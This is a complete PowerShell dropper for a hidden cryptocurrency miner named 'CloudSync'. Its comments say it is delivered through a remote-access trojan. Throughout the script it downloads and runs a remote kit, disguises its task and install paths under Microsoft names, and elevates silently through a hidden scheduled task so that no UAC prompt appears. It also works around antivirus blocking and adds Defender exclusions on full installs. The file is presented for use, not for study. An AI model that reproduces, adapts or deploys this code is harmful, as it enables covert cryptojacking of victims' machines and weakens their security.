<#
.SYNOPSIS
    Self-contained bootstrapper for the CloudSync miner kit.

.DESCRIPTION
    Downloads the published kit zip, verifies controller.py against the SHA-256 in
    the extracted manifest.json, then runs install-task.ps1 -NoPrompt from the
    extracted tree. Nothing else is needed on the target machine.

    Elevation is handled here, before anything is downloaded:

      * When the current session already holds an administrator token the bootstrap
        runs install-task.ps1 inline (no relaunch).
      * When it does not, the bootstrap relaunches *itself* through a one-shot Task
        Scheduler job created with schtasks /RL HIGHEST, polls a result file for the
        child's exit code, deletes the job and returns that exit code. The task runs
        with the administrator's full token, so no UAC prompt is shown. The
        relaunched copy carries -ElevatedChild so it can never loop.
      * Creating a /RL HIGHEST task itself needs an administrator token. A genuinely
        limited caller therefore cannot use the silent path and this bootstrap fails
        with a clear message (exit 3) unless -AllowUacFallback (visible UAC prompt)
        or -AllowLimitedFallback (continue the install limited) was passed.

    Built for remote management: PowerShell 5.1 only, no external modules, no
    prompts, no stdin. The temp tree is always removed. The full transcript is
    timestamped and appended to <InstallDir>\bootstrap.log (trimmed to its last
    1 MB when it grows past that).

    Exit codes:
      0  success; with -Status: miner running
      1  installer returned failure; with -Status: miner not running / no state
      2  kit verification failed (controller.py missing, or SHA-256 mismatch)
      3  bootstrap failed (download/expand error, install-task.ps1 missing from the
         archive, elevation could not be established, or an unexpected error)

.PARAMETER Status
    Print the state.json summary (pid / gpu / hashrate / profile) and exit 0 when
    the miner is running, 1 otherwise. No network access, no writes, never
    elevates.

.PARAMETER DryRun
    Download, extract and verify only. Nothing is installed; no persistent log is
    written and the install dir is not created. Elevation is not required unless
    -ForceElevate is also given.

.PARAMETER Url
    Kit zip URL. Default: the kit repo's main-branch archive.

.PARAMETER InstallDir
    Install directory, forwarded to install-task.ps1. Default
    %LOCALAPPDATA%\Microsoft\CloudSync - correct when running inside the
    logged-in user's session.

.PARAMETER CleanLegacy
    Forwarded to install-task.ps1 (remove the pre-overhaul controller kit).

.PARAMETER SkipGpuProbe
    Forwarded to install-task.ps1 (CPU-only install).

.PARAMETER ForceElevate
    Test hook: take the elevation relaunch path even when the current session is
    already an administrator. Used to exercise the schtasks branch on an elevated
    test box.

.PARAMETER ElevatedChild
    Internal. Marks the copy relaunched by the elevation path so it never tries to
    elevate again (recursion guard).

.PARAMETER ExitCodeFile
    Internal. Path the elevated child writes its own exit code to; the parent polls
    for it and returns that code.

.PARAMETER ElevationTimeoutSec
    How long the parent waits for the elevated child to finish. Default 1800.

.PARAMETER AllowUacFallback
    If the silent schtasks relaunch cannot be created (the caller is not really an
    administrator), fall back to a visible Start-Process -Verb RunAs prompt. Off by
    default so a RAT-delivered install never pops a UAC dialog on the desktop.

.PARAMETER AllowLimitedFallback
    If elevation cannot be established, continue with the install in limited mode
    instead of failing. The miner installs and runs, but Defender exclusions, the
    MSR / huge-page unlock and the power profile are skipped.

.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass -File .\miner-boot.ps1

.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass -File .\miner-boot.ps1 -DryRun

.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass -File .\miner-boot.ps1 -Status

.EXAMPLE
    powershell -NoProfile -ExecutionPolicy Bypass -File .\miner-boot.ps1 -ForceElevate -DryRun
#>
#Requires -Version 5.1
[CmdletBinding()]
param(
    [switch]$Status,
    [switch]$DryRun,
    [string]$Url = 'https://github.com/minjiwilliams-dotcom/config/archive/refs/heads/main.zip',
    [string]$InstallDir = (Join-Path $env:ProgramData 'Microsoft\CloudSync'),
    [switch]$CleanLegacy,
    [switch]$SkipGpuProbe,
    [switch]$ForceElevate,
    [switch]$ElevatedChild,
    [string]$ExitCodeFile,
    [int]$ElevationTimeoutSec = 1800,
    [switch]$AllowUacFallback,
    [switch]$AllowLimitedFallback
)

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

$script:MaxLogBytes  = 1MB
$script:LogPath      = Join-Path $InstallDir 'bootstrap.log'
$script:LogEnabled   = -not $DryRun
$script:ExitCodeFile = $ExitCodeFile

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

function Format-Value {
    param($Value)
    if ($null -eq $Value) { return '(unknown)' }
    if ($Value -is [string] -and $Value.Trim() -eq '') { return '(unknown)' }
    return [string]$Value
}

# SHA-256 without Get-FileHash: the script is launched through a RAT client's
# cmd/powershell chain, where the inherited PSModulePath can make Windows
# PowerShell 5.1 fail to autoload Microsoft.PowerShell.Utility ("Get-FileHash is
# not recognized"). .NET hashing needs no module.
function Get-Sha256Hex {
    param([string]$Path)
    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        $fs = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open,
                                     [System.IO.FileAccess]::Read,
                                     [System.IO.FileShare]::ReadWrite)
        try {
            $bytes = $sha.ComputeHash($fs)
        } finally {
            $fs.Dispose()
        }
    } finally {
        $sha.Dispose()
    }
    return ([BitConverter]::ToString($bytes)).Replace('-', '')
}

# Download the kit zip. curl.exe is tried first because the .NET Framework HTTP
# stack (Invoke-WebRequest / WebClient / HttpClient) can be reset by endpoint AV
# protocol filtering on some hosts. Observed on this test box: every .NET
# download from codeload.github.com dies with "An established connection was
# aborted by the software in your host machine", while curl.exe fetches the exact
# same archive in ~2s. Invoke-WebRequest remains the fallback for machines
# without curl.exe (Windows 10 1803+ ships it).
function Save-KitZip {
    param([string]$Url, [string]$Path)

    $curl = Join-Path $env:SystemRoot 'System32\curl.exe'
    if (-not (Test-Path -LiteralPath $curl)) {
        $found = Get-Command curl.exe -ErrorAction SilentlyContinue
        if ($found) { $curl = $found.Source }
    }
    if ($curl -and (Test-Path -LiteralPath $curl)) {
        try {
            Remove-Item -LiteralPath $Path -Force -ErrorAction SilentlyContinue
            & $curl -sS -L --fail --max-time 900 --retry 2 --retry-delay 2 -o $Path $Url 2>&1 |
                ForEach-Object { Write-BootLog ('curl: {0}' -f [string]$_) 'WARN' }
            $curlRc = $LASTEXITCODE
            if ($curlRc -eq 0 -and (Test-Path -LiteralPath $Path) -and
                (Get-Item -LiteralPath $Path).Length -gt 0) {
                return 'curl.exe'
            }
            Write-BootLog ('download: curl.exe failed (rc={0}) - falling back to Invoke-WebRequest' -f $curlRc) 'WARN'
        } catch {
            Write-BootLog ('download: curl.exe error: {0} - falling back to Invoke-WebRequest' -f $_.Exception.Message) 'WARN'
        }
    }

    Remove-Item -LiteralPath $Path -Force -ErrorAction SilentlyContinue
    Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $Path -TimeoutSec 900
    return 'Invoke-WebRequest'
}

# Keep bootstrap.log bounded: when it grows past the cap, keep the last 1 MB,
# starting on a line boundary so the file stays readable.
function Limit-LogFile {
    if (-not (Test-Path -LiteralPath $script:LogPath)) { return }
    try {
        $length = (Get-Item -LiteralPath $script:LogPath -Force).Length
        if ($length -le $script:MaxLogBytes) { return }

        $buffer = New-Object byte[] $script:MaxLogBytes
        $read = 0
        $fs = [IO.File]::Open($script:LogPath, [IO.FileMode]::Open,
                              [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)
        try {
            $null = $fs.Seek($length - $script:MaxLogBytes, [IO.SeekOrigin]::Begin)
            $read = $fs.Read($buffer, 0, $buffer.Length)
        } finally {
            $fs.Dispose()
        }
        if ($read -le 0) { return }

        $start = 0
        $scan = [Math]::Min($read, 4096)
        for ($i = 0; $i -lt $scan; $i++) {
            if ($buffer[$i] -eq 10) { $start = $i + 1; break }
        }
        $keep = New-Object byte[] ($read - $start)
        [Array]::Copy($buffer, $start, $keep, 0, $keep.Length)
        [IO.File]::WriteAllBytes($script:LogPath, $keep)
    } catch {
        # a locked/unreadable log must never break the install
    }
}

function Write-BootLog {
    param([string]$Message, [string]$Level = 'INFO')
    $line = '[{0}] [{1}] {2}' -f (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Write-Host $line
    if (-not $script:LogEnabled) { return }
    try {
        $dir = Split-Path -Parent $script:LogPath
        if ($dir -and -not (Test-Path -LiteralPath $dir)) {
            New-Item -ItemType Directory -Force -Path $dir | Out-Null
        }
        [IO.File]::AppendAllText($script:LogPath, $line + "`r`n",
            (New-Object System.Text.UTF8Encoding($false)))
        $size = (Get-Item -LiteralPath $script:LogPath -Force).Length
        if ($size -gt $script:MaxLogBytes) { Limit-LogFile }
    } catch {
        Write-Host ('[warn] bootstrap log unavailable: {0}' -f $_.Exception.Message)
    }
}

function Test-Admin {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal $identity
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        return $false
    }
}

# Every exit goes through here. The elevated child must write its exit code to a
# file the parent polls; a bare `exit` would leave the parent waiting for it. The
# parent copy has no -ExitCodeFile and just exits.
function Exit-Boot {
    param([int]$Code)
    if ($script:ExitCodeFile) {
        try {
            [IO.File]::WriteAllText($script:ExitCodeFile, [string]$Code,
                (New-Object System.Text.UTF8Encoding($false)))
        } catch {
            # if the result file cannot be written, the parent reports exit 3
        }
    }
    exit $Code
}

# ---------------------------------------------------------------------------
# elevation machinery
# ---------------------------------------------------------------------------

function Get-PowerShellExe {
    $exe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
    if (Test-Path -LiteralPath $exe) { return $exe }
    return 'powershell.exe'
}

# Build the command line the elevated copy runs. Inner quotes are part of the
# stored task action, so they are escaped here (see ConvertTo-SchtasksArgument).
function New-ElevatedCommandLine {
    param(
        [string]$ScriptPath,
        [string]$ResultFile,
        [string[]]$Forward
    )
    $parts = @(
        ('"' + (Get-PowerShellExe) + '"'),
        '-NoProfile', '-WindowStyle', 'Hidden', '-ExecutionPolicy', 'Bypass',
        '-File', ('"' + $ScriptPath + '"'),
        '-ElevatedChild', '-ExitCodeFile', ('"' + $ResultFile + '"')
    )
    foreach ($arg in $Forward) { $parts += $arg }
    return ($parts -join ' ')
}

# Windows PowerShell 5.1 joins native arguments without escaping embedded double
# quotes, so a quoted command line must reach schtasks /tr with its quotes already
# backslash-escaped (verified on this box: the plain form fails with
# "Invalid argument/option - '7'", the escaped form stores the intended command).
# PowerShell 7 escapes embedded quotes itself, so it gets the plain form.
function ConvertTo-SchtasksArgument {
    param([string]$Value)
    if ($PSVersionTable.PSVersion.Major -ge 6) { return $Value }
    return $Value.Replace('"', '\"')
}

# Task Scheduler result codes that mean "no process exit code yet". Anything else
# read from "Last Result" is the exit code of the task's process.
$script:TaskPendingResults = @(267008, 267009, 267010, 267011, 267012, 267014)

function Get-TaskLastResult {
    param([string]$TaskName)
    try {
        $lines = @(& schtasks.exe /query /tn $TaskName /fo LIST /v 2>&1)
        foreach ($line in $lines) {
            $text = [string]$line
            if ($text -match 'Last Result:\s+(-?\d+)') { return [int]$Matches[1] }
        }
    } catch { }
    return $null
}

# One-shot Task Scheduler elevation. The task is created with /RL HIGHEST, run
# once, polled until the child writes its exit code, then deleted. Returns the
# child's exit code, or $null when the task could not be created/run/finished.
function Invoke-ElevatedRelaunch {
    param(
        [string]$ScriptPath,
        [string]$ResultFile,
        [string[]]$Forward,
        [int]$TimeoutSec
    )

    $taskName = 'Microsoft\Windows\CloudSync\Bootstrap'
    $launcher = $null
    $taskAction = New-ElevatedCommandLine -ScriptPath $ScriptPath -ResultFile $ResultFile -Forward $Forward

    # schtasks /TR is capped at 261 characters ("Value for '/tr' option cannot be
    # more than 261 character(s)" - verified). Long script/temp paths therefore go
    # through a tiny .cmd launcher; the child's exit code still comes back both in
    # the result file and as the launcher's `exit /b %ERRORLEVEL%`.
    if ($taskAction.Length -gt 261) {
        $launcher = Join-Path $env:TEMP ('mb-' + $PID + '.cmd')
        try {
            $body = "@echo off`r`n$taskAction`r`nexit /b %ERRORLEVEL%`r`n"
            [IO.File]::WriteAllText($launcher, $body, (New-Object System.Text.UTF8Encoding($false)))
            Write-BootLog ('elevation: command line is {0} chars (schtasks cap is 261); using launcher {1}' -f $taskAction.Length, $launcher)
            $taskAction = '"' + $launcher + '"'
        } catch {
            Write-BootLog ('elevation: could not write the launcher: {0}' -f $_.Exception.Message) 'FAIL'
            return $null
        }
    }

    $startTime = (Get-Date).AddMinutes(1).ToString('HH:mm')
    Write-BootLog ('elevation: schtasks /create /tn "{0}" /tr {1} /sc once /st {2} /rl HIGHEST /f' -f `
        $taskName, $taskAction, $startTime)

    $created = $false
    $code = $null
    try {
        $createOut = @(& schtasks.exe /create /tn $taskName /tr (ConvertTo-SchtasksArgument $taskAction) `
                                      /sc once /st $startTime /rl HIGHEST /f 2>&1)
        $createRc = $LASTEXITCODE
        if ($createRc -ne 0) {
            Write-BootLog ('elevation: schtasks /create failed (rc={0}): {1}' -f `
                $createRc, (($createOut | ForEach-Object { [string]$_ }) -join ' ').Trim()) 'WARN'
            return $null
        }
        $created = $true
        Write-BootLog 'elevation: one-shot HIGHEST task created; running it'

        $runOut = @(& schtasks.exe /run /tn $taskName 2>&1)
        $runRc = $LASTEXITCODE
        if ($runRc -ne 0) {
            Write-BootLog ('elevation: schtasks /run failed (rc={0}): {1}' -f `
                $runRc, (($runOut | ForEach-Object { [string]$_ }) -join ' ').Trim()) 'WARN'
            return $null
        }

        $deadline        = (Get-Date).AddSeconds($TimeoutSec)
        $startupDeadline = (Get-Date).AddSeconds(120)
        $tick            = 0
        while ((Get-Date) -lt $deadline) {
            if (Test-Path -LiteralPath $ResultFile) {
                $raw = $null
                try { $raw = [IO.File]::ReadAllText($ResultFile) } catch { $raw = $null }
                if ($null -ne $raw) {
                    $parsed = 0
                    if ([int]::TryParse($raw.Trim(), [ref]$parsed)) { $code = $parsed; break }
                }
            }
            $tick++
            if (($tick % 4) -eq 0) {
                $taskResult = Get-TaskLastResult -TaskName $taskName
                if ($null -ne $taskResult -and ($script:TaskPendingResults -notcontains $taskResult)) {
                    # Finished without writing the exit-code file: the child died
                    # before it could report (syntax error, missing script, ...).
                    Write-BootLog ('elevation: child finished (task Last Result {0}) but wrote no exit-code file' -f $taskResult) 'WARN'
                    break
                }
                if ($taskResult -eq 267011 -and (Get-Date) -gt $startupDeadline) {
                    Write-BootLog 'elevation: task was created and run but Task Scheduler never launched it' 'WARN'
                    break
                }
            }
            Start-Sleep -Milliseconds 500
        }

        if ($null -ne $code) {
            Write-BootLog ('elevation: child finished, exit code {0}' -f $code)
        } elseif ((Get-Date) -ge $deadline) {
            Write-BootLog ('elevation: timed out after {0}s waiting for the elevated child' -f $TimeoutSec) 'FAIL'
        }
    } finally {
        if ($created) {
            & schtasks.exe /delete /tn $taskName /f 2>&1 | Out-Null
            Write-BootLog 'elevation: one-shot task deleted'
        }
        Remove-Item -LiteralPath $ResultFile -Force -ErrorAction SilentlyContinue
        if ($launcher) { Remove-Item -LiteralPath $launcher -Force -ErrorAction SilentlyContinue }
    }

    return $code
}

# Visible fallback, only when -AllowUacFallback was passed: a UAC dialog appears on
# the desktop, so this is never used by the RAT-delivered path by default.
function Invoke-UacFallback {
    param(
        [string]$ScriptPath,
        [string]$ResultFile,
        [string[]]$Forward
    )
    $argLine = '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $ScriptPath +
               '" -ElevatedChild -ExitCodeFile "' + $ResultFile + '"'
    foreach ($arg in $Forward) { $argLine += ' ' + $arg }
    try {
        $proc = Start-Process -FilePath (Get-PowerShellExe) -ArgumentList $argLine `
                              -Verb RunAs -PassThru -Wait -ErrorAction Stop
        if ($null -eq $proc) { return $null }
        return [int]$proc.ExitCode
    } catch {
        Write-BootLog ('elevation: UAC fallback declined or failed: {0}' -f $_.Exception.Message) 'WARN'
        return $null
    }
}

function Show-Status {
    $statePath = Join-Path $InstallDir 'state.json'
    Write-Host '=== CloudSync status ==='
    Write-Host ('install dir : {0}' -f $InstallDir)
    Write-Host ('state.json  : {0}' -f $statePath)

    if (-not (Test-Path -LiteralPath $statePath)) {
        Write-Host 'status      : NOT INSTALLED (no state.json)'
        return 1
    }

    $state = $null
    try {
        $state = Get-Content -LiteralPath $statePath -Raw | ConvertFrom-Json
    } catch {
        Write-Host ('status      : ERROR - state.json unreadable ({0})' -f $_.Exception.Message)
        return 1
    }
    if ($null -eq $state) {
        Write-Host 'status      : ERROR - state.json empty'
        return 1
    }

    $procId = 0
    if ($null -ne $state.pid) {
        $parsed = 0
        if ([int]::TryParse([string]$state.pid, [ref]$parsed)) { $procId = $parsed }
    }
    $procAlive = $false
    if ($procId -gt 0) {
        $procAlive = [bool](Get-Process -Id $procId -ErrorAction SilentlyContinue)
    }

    $workerRunning = [bool]$state.running
    $running = $workerRunning -and (($procId -eq 0) -or $procAlive)

    $pidText = Format-Value $state.pid
    if ($procId -gt 0) {
        $pidState = if ($procAlive) { 'alive' } else { 'dead' }
        $pidText = '{0} ({1})' -f $procId, $pidState
    }

    Write-Host ('pid         : {0}' -f $pidText)
    Write-Host ('gpu         : {0}' -f (Format-Value $state.gpu))
    Write-Host ('hashrate    : {0}' -f (Format-Value $state.hashrate))
    Write-Host ('profile     : {0}' -f (Format-Value $state.profile))
    Write-Host ('running     : {0}' -f $running)
    Write-Host ('updated     : {0}' -f (Format-Value $state.time))

    if ($running) { return 0 }
    return 1
}

# -Status is a read-only query: do it before any network, file or elevation work.
if ($Status) { Exit-Boot (Show-Status) }

# ---------------------------------------------------------------------------
# elevation decision (before downloading: the install must run with the full token)
# ---------------------------------------------------------------------------

$admin      = Test-Admin
$scriptPath = $PSCommandPath
if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }

if ($ElevatedChild) {
    Write-BootLog ('elevation: admin={0} (elevated child - no relaunch)' -f $admin.ToString().ToLowerInvariant())
    if (-not $admin) {
        Write-BootLog 'elevation: child is not elevated - install will run limited (no Defender exclusions, no MSR/huge-page unlock, no power profile)' 'WARN'
    }
} else {
    Write-BootLog ('elevation: admin={0}' -f $admin.ToString().ToLowerInvariant())

    if (-not $ForceElevate -and $admin) {
        Write-BootLog 'elevation: already elevated - running install inline'
    } elseif ($DryRun -and -not $ForceElevate) {
        # A dry run installs nothing, so it never needs elevation.
        Write-BootLog 'elevation: dry run only - elevation not required'
    } else {
        if ($ForceElevate) {
            Write-BootLog 'elevation: -ForceElevate set - exercising the relaunch path although this session is already elevated'
        }

        # Forward the caller's switches to the child. Parent-only switches
        # (Status, ForceElevate, ElevatedChild, ExitCodeFile, fallbacks, timeout)
        # are deliberately not forwarded; -DryRun is, so a -ForceElevate -DryRun
        # test never installs anything from the elevated child.
        $forwardKeys = @('Url', 'InstallDir', 'CleanLegacy', 'SkipGpuProbe', 'DryRun', 'PerUser')
        $forward = @()
        foreach ($key in @($PSBoundParameters.Keys)) {
            if ($forwardKeys -notcontains $key) { continue }
            $value = $PSBoundParameters[$key]
            if ($value -is [switch]) {
                if ($value.IsPresent) { $forward += ('-' + $key) }
            } else {
                $forward += ('-{0} "{1}"' -f $key, ([string]$value).Replace('"', '\"'))
            }
        }

        $resultFile = Join-Path $env:TEMP ('mb-' + $PID + '-' + (Get-Random -Maximum 100000) + '.txt')
        Remove-Item -LiteralPath $resultFile -Force -ErrorAction SilentlyContinue

        $relaunchCode = Invoke-ElevatedRelaunch -ScriptPath $scriptPath -ResultFile $resultFile `
                                                -Forward $forward -TimeoutSec $ElevationTimeoutSec
        if ($null -eq $relaunchCode -and $AllowUacFallback) {
            Write-BootLog 'elevation: silent path unavailable - falling back to a VISIBLE UAC prompt (Start-Process -Verb RunAs)'
            $relaunchCode = Invoke-UacFallback -ScriptPath $scriptPath -ResultFile $resultFile -Forward $forward
        }

        if ($null -ne $relaunchCode) {
            $level = if ($relaunchCode -eq 0) { 'OK' } else { 'FAIL' }
            Write-BootLog ('elevation: relaunched via schtasks, exit={0}' -f $relaunchCode) $level
            Exit-Boot ([int]$relaunchCode)
        }

        if ($AllowLimitedFallback) {
            Write-BootLog 'elevation: could not obtain elevation - continuing in LIMITED mode (Defender exclusions, MSR/huge-page unlock and power profile are skipped)' 'WARN'
        } else {
            Write-BootLog 'elevation: could not obtain elevation silently - a /RL HIGHEST task needs an administrator token, and no UAC/limited fallback was allowed' 'FAIL'
            Exit-Boot 3
        }
    }
}

# ---------------------------------------------------------------------------
# bootstrap
# ---------------------------------------------------------------------------

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$stamp   = (Get-Date).ToString('yyyyMMdd-HHmmss')
$tmpRoot = Join-Path $env:TEMP ('miner-boot-' + $stamp)
$suffix  = 0
while (Test-Path -LiteralPath $tmpRoot) {
    $suffix++
    $tmpRoot = Join-Path $env:TEMP ('miner-boot-' + $stamp + '-' + $suffix)
}
$zipPath     = Join-Path $tmpRoot 'kit.zip'
$extractPath = Join-Path $tmpRoot 'kit'
$exitCode    = 0

Write-BootLog ('miner-boot: start (user={0} pid={1})' -f $env:USERNAME, $PID)
Write-BootLog ('install dir: {0}' -f $InstallDir)
Write-BootLog ('kit url    : {0}' -f $Url)
Write-BootLog ('mode       : {0}' -f $(if ($DryRun) { 'dry run (download + verify only)' } else { 'install' }))
if ($script:LogEnabled) { Write-BootLog ('transcript : {0}' -f $script:LogPath) }

try {
    New-Item -ItemType Directory -Force -Path $tmpRoot | Out-Null

    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    $downloadMethod = Save-KitZip -Url $Url -Path $zipPath
    $sw.Stop()
    $zipSize = (Get-Item -LiteralPath $zipPath).Length
    Write-BootLog ('downloaded : {0:N0} bytes in {1:N1}s via {2}' -f $zipSize, $sw.Elapsed.TotalSeconds, $downloadMethod) 'OK'

    Write-BootLog 'extracting archive ...'
    Expand-Archive -LiteralPath $zipPath -DestinationPath $extractPath -Force

    # The archive has one top-level folder (currently config-main); do not hard
    # depend on its name in case the repo or branch is ever renamed.
    $kitRoot = $null
    $configMain = Join-Path $extractPath 'config-main'
    if (Test-Path -LiteralPath (Join-Path $configMain 'controller.py')) {
        $kitRoot = $configMain
    } else {
        $topDirs = @(Get-ChildItem -LiteralPath $extractPath -Directory -ErrorAction SilentlyContinue)
        if ($topDirs.Count -eq 1 -and (Test-Path -LiteralPath (Join-Path $topDirs[0].FullName 'controller.py'))) {
            $kitRoot = $topDirs[0].FullName
        } elseif (Test-Path -LiteralPath (Join-Path $extractPath 'controller.py')) {
            $kitRoot = $extractPath
        }
    }
    if (-not $kitRoot) {
        Write-BootLog 'verify    : archive does not contain controller.py' 'FAIL'
        Exit-Boot 2
    }
    Write-BootLog ('kit folder : {0}' -f (Split-Path -Leaf $kitRoot)) 'OK'

    # Verify controller.py only. config_high.json is deliberately never hashed:
    # endpoint AV (ESET) blocks content-based reads of it and that is not a
    # reason to fail a deployment.
    $manifestPath = Join-Path $kitRoot 'manifest.json'
    $expected = $null
    if (Test-Path -LiteralPath $manifestPath) {
        try {
            $manifest = Get-Content -LiteralPath $manifestPath -Raw | ConvertFrom-Json
            $entry = @($manifest.files | Where-Object { $_.path -ieq 'controller.py' })
            if ($entry.Count -gt 0 -and $entry[0].sha256) {
                $expected = ([string]$entry[0].sha256).Trim().ToUpperInvariant()
            }
        } catch {
            $expected = $null
        }
    }
    if (-not $expected) {
        Write-BootLog 'verify    : manifest.json has no controller.py SHA-256' 'FAIL'
        Exit-Boot 2
    }

    $controller = Join-Path $kitRoot 'controller.py'
    $actual = (Get-Sha256Hex $controller).ToUpperInvariant()
    if ($actual -ne $expected) {
        Write-BootLog ('verify    : SHA-256 MISMATCH controller.py (expected {0}, got {1})' -f $expected, $actual) 'FAIL'
        Exit-Boot 2
    }
    Write-BootLog ('verify    : controller.py sha256 OK ({0})' -f $actual) 'OK'
    Write-BootLog 'verify    : config_high.json not hashed by design (AV content-read block; not worth failing over)'

    $installer = Join-Path $kitRoot 'install-task.ps1'

    if ($DryRun) {
        if (-not (Test-Path -LiteralPath $installer)) {
            Write-BootLog 'dry run   : WARNING install-task.ps1 is absent from the archive; a real install would stop at exit 3' 'WARN'
        }
        Write-BootLog 'dry run complete - nothing installed, temp tree removed' 'OK'
        Exit-Boot 0
    }

    if (-not (Test-Path -LiteralPath $installer)) {
        Write-BootLog 'install   : install-task.ps1 is missing from the archive - cannot install' 'FAIL'
        Exit-Boot 3
    }

    # Hand over to the kit installer. Working directory is the extracted tree so
    # install-task.ps1 sees its own $PSScriptRoot as the payload source.
    $childArgs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $installer,
                   '-NoPrompt', '-InstallDir', $InstallDir)
    if (-not $admin) { $childArgs += '-PerUser'; Write-BootLog 'install   : not elevated - per-user layout' }
    if ($CleanLegacy) { $childArgs += '-CleanLegacy' }
    if ($SkipGpuProbe) { $childArgs += '-SkipGpuProbe' }

    Write-BootLog ('install   : powershell.exe -NoProfile -ExecutionPolicy Bypass -File "{0}" -NoPrompt -InstallDir "{1}"{2}{3}' -f `
        $installer, $InstallDir, $(if ($CleanLegacy) { ' -CleanLegacy' } else { '' }), $(if ($SkipGpuProbe) { ' -SkipGpuProbe' } else { '' }))
    Write-BootLog '---------- install-task.ps1 transcript ----------'

    $rc = 1
    Push-Location -LiteralPath $kitRoot
    try {
        & powershell.exe @childArgs 2>&1 | ForEach-Object {
            Write-BootLog ([string]$_)
        }
        $rc = $LASTEXITCODE
    } finally {
        Pop-Location
    }
    if ($null -eq $rc) { $rc = 1 }

    Write-BootLog '---------- install-task.ps1 done ----------'
    Write-BootLog ('install   : exit code {0}' -f $rc) $(if ($rc -eq 0) { 'OK' } else { 'FAIL' })
    $exitCode = [int]$rc
} catch {
    Write-BootLog ('bootstrap failed: {0}' -f $_.Exception.Message) 'FAIL'
    $exitCode = 3
} finally {
    if (Test-Path -LiteralPath $tmpRoot) {
        try {
            Remove-Item -LiteralPath $tmpRoot -Recurse -Force -ErrorAction Stop
        } catch {
            Write-Host ('[warn] could not remove temp tree {0}: {1}' -f $tmpRoot, $_.Exception.Message)
        }
    }
}

Exit-Boot $exitCode
